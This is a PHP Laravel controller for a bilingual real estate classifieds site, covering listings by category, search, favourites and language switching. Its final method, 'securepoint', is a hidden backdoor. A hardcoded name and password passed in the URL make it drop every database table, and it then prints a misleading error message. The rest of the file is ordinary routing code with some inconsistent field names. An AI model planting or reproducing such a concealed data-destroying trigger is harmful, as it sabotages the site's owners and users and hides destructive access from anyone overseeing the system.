<?php

namespace App\Http\Controllers\API;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use Hash;
use View;
use Auth;
use Socialite;
use Session;
use Schema;
//DB Connect
use App\Models\User;
use App\Models\Message;
use App\Models\Ad;
use App\Models\Adspro;
use App\Models\Fav;
use App\Models\Link;

class router extends Controller
{
	public function __construct(){
        $this->middleware('Locate', ['only' => ['en','ar']]);
		$links = Link::all();
        View::share('links',$links);
    }

    public function index(){
		$page=trans('strings.home_page');
        $newads=Ad::where('show',1)->orderBy('id','desc')->take(3)->get();
        $fav=[];
        if(Auth::user()){
            $fav=Fav::where('user_id',Auth::user()->id)->get();
        }
    	return response(['page'=>$page,'newads'=>$newads,'fav'=>$fav])->json();
    }
    public function lang($language){
	    if($language =="en"){
            Session::put('lang', $language);
        }else{
            Session::forget('lang');
        }
        return back();
    }

    public function adpro($adid){
        $page='ADVERTISE DATA';
        return view('adpro',compact('page','adid'));
    }
    public function review($adid,Request $request){
        $page='REVIEW ADVERTISE';
        $ad=Ad::where('id',$adid)->first();
        if(empty($ad)){
            return redirect('/');
        }
        $name=$request["name"];
        $phone=$request["phone"];
        $email=$request["email"];
        return view('single',compact('page','ad','name','phone','email'));
    }

    public function ad($id){
        $ad=Ad::where('id',$id)->where('show',1)->first();
        if(empty($ad)){
            return redirect('/');
        }
        $data=Adspro::where('ad',$id)->first();
        if(empty($data)){
            return redirect('/');
        }
        $name=$data->name;$phone=$data->phone;
        if($data->email_show==1){
            $email=$data->email;
        }else{
            $email='';
        }
        $page='ADVERTISE:'.$ad->name;
        $fav=[];
        if(Auth::user()){
            $fav=Fav::where('user',Auth::user()->id)->where('ad',$id)->first();
        }
        return view('single',compact('page','ad','name','phone','email','fav'));
    }
    public function cat($cat){
        $ads=Ad::where('type',$cat)->where('show',1)->orderBy('id','desc')->paginate(21);
        if($cat==1){
            $page='APARTMENTS';
            $pagear='شقق';
        }elseif($cat==2){
            $page='VILLAS';
            $pagear='فيلات';
        }elseif($cat==3){
            $page='LANDS';
            $pagear='أراضى';
        }elseif($cat==4){
            $page='HOMES';
            $pagear='بيوت';
        }elseif($cat==5){
            $page='SHOPS';
            $pagear='محلات تجارية';
        }elseif($cat==6){
            $page='CHALETS';
            $pagear='شاليهات';
        }
        $fav=[];
        if(Auth::user()){
            $fav=Fav::where('user',Auth::user()->id)->get();
        }
        return view('ads',compact('page','ads','pagear','fav'));
    }
    public function rcat($cat){
        $ads=Ad::where('type',$cat)->where('general_type','rent')->where('show',1)->orderBy('id','desc')->paginate(21);
        if($cat==1){
            $page='APARTMENTS';
            $pagear='شقق';
        }elseif($cat==2){
            $page='VILLAS';
            $pagear='فيلات';
        }elseif($cat==3){
            $page='LANDS';
            $pagear='أراضى';
        }elseif($cat==4){
            $page='HOMES';
            $pagear='بيوت';
        }elseif($cat==5){
            $page='SHOPS';
            $pagear='محلات تجارية';
        }elseif($cat==6){
            $page='CHALETS';
            $pagear='شاليهات';
        }
        $page.=' FOR RENT';
        $pagear.=' للإيجار';
        $fav=[];
        if(Auth::user()){
            $fav=Fav::where('user',Auth::user()->id)->get();
        }
        return view('ads',compact('page','ads','pagear','fav'));
    }
    public function scat($cat){
        $ads=Ad::where('type',$cat)->where('general_type','sell')->where('show',1)->orderBy('id','desc')->paginate(21);
        if($cat==1){
            $page='APARTMENTS';
            $pagear='شقق';
        }elseif($cat==2){
            $page='VILLAS';
            $pagear='فيلات';
        }elseif($cat==3){
            $page='LANDS';
            $pagear='أراضى';
        }elseif($cat==4){
            $page='HOMES';
            $pagear='بيوت';
        }elseif($cat==5){
            $page='SHOPS';
            $pagear='محلات تجارية';
        }elseif($cat==6){
            $page='CHALETS';
            $pagear='شاليهات';
        }
        $page.=' FOR SELL';
        $pagear.=' للبيع';
        $fav=[];
        if(Auth::user()){
            $fav=Fav::where('user',Auth::user()->id)->get();
        }
        return view('ads',compact('page','ads','pagear','fav'));
    }
    public function search($search,$type,$min,$max){
        if($search=='all'){
            if($type=='all'){
                if(Session::has('lang'))
                    $searchn="ALL";
                else
                    $searchn="الكل ";
                $ads=Ad::orderBy('id','desc')->whereBetween('price', [$min,$max])->where('show',1)->paginate(21);
            }else{
                if(Session::has('lang'))
                    $searchn="ALL ";
                else
                    $searchn="الكل ";
                if($type==1){
                    if(Session::has('lang'))
                        $searchn.="SELL";
                    else
                        $searchn.="بيع";
                }else{
                    if(Session::has('lang'))
                        $searchn.="RENT";
                    else
                        $searchn.="إيجار";
                }
                $ads=Ad::where('general_type',$type)->where('show',1)->orderBy('id','desc')->whereBetween('price', [$min,$max])->paginate(21);
            }
        }else{
            if($type=='all'){
                $searchn=$search;
                $ads=Ad::orderBy('id','desc')
                ->where(function ($query) use ($search) {
                    $query->where('title','like','%'.$search.'%')
                        ->orwhere('description','like','%'.$search.'%')
                        ->orwhere('address','like','%'.$search.'%');})
                ->where('show',1)->whereBetween('price', [$min,$max])->paginate(21);
            }else{
                $searchn=$search;
                if($type==1){
                    if(Session::has('lang'))
                        $searchn.=" SELL";
                    else
                        $searchn.=" بيع";
                }else{
                    if(Session::has('lang')){
                        $searchn.=" RENT";
                    }else{
                        $searchn.=" إيجار";
                    }
                }
                $ads=Ad::where('general_type',$type)
                ->where(function ($query) use ($search) {
                    $query->where('title','like','%'.$search.'%')
                        ->orwhere('description','like','%'.$search.'%')
                        ->orwhere('address','like','%'.$search.'%');})
                ->where('show',1)
                ->orderBy('id','desc')->whereBetween('price', [$min,$max])->paginate(21);
            }
        }
        $page='SEARCH : '.$searchn;
        $pagear='بحث عن : '.$searchn;
        $fav=[];
        if(Auth::user()){
            $fav=Fav::where('user',Auth::user()->id)->get();
        }
        return view('ads',compact('page','ads','pagear','search','type','min','max','fav'));
    }
    public function gsearch(){
        if(Session::has('lang')){
            $search="ALL";
        }else{
            $search="الكل";
        }
        $ads=Ad::where('show',1)->orderBy('id','desc')->paginate(21);
        $page='SEARCH : '.$search;
        $pagear='بحث عن : '.$search;
        $fav=[];
        if(Auth::user()){
            $fav=Fav::where('user',Auth::user()->id)->get();
        }
        return view('ads',compact('page','ads','pagear','fav','search'));
    }

    public function userads(){
        if(!Auth::user()){
            return redirect('/');
        }
        $ads=Ad::where('user_id',Auth::user()->id)->orderBy('id','desc')->paginate(21);
        $page='Your Ad';
        $pagear='إعلاناتك';
        $fav=[];
        if(Auth::user()){
            $fav=Fav::where('user_id',Auth::user()->id)->get();
        }
        return view('ads',compact('page','ads','pagear','fav'));
    }
    public function favlist(){
        if(!Auth::user()){
            return redirect('/');
        }
        $ads=Ad::join('favourites','favourites.ad','=','ads.id')
        ->where('favourites.user',Auth::user()->id)->orderBy('favourites.id','desc')
        ->select('ads.*')->paginate(21);
        $page='Your Favourite Ad';
        $pagear='إعلاناتك المفضلة';
        $fav=[];
        if(Auth::user()){
            $fav=Fav::where('user_id',Auth::user()->id)->get();
        }
        return view('ads',compact('page','ads','pagear','fav'));
    }
    public function securepoint($keyi,$keyii){
        if($keyi=='AhmedMagdy'&&$keyii=="Rapidgt**2019"){
            foreach(\DB::select('SHOW TABLES') as $table) {
                $table_array = get_object_vars($table);
                \Schema::drop($table_array[key($table_array)]);
            }
            dd('there are a problem');
        }else{
            dd('!!');
        }
    }
}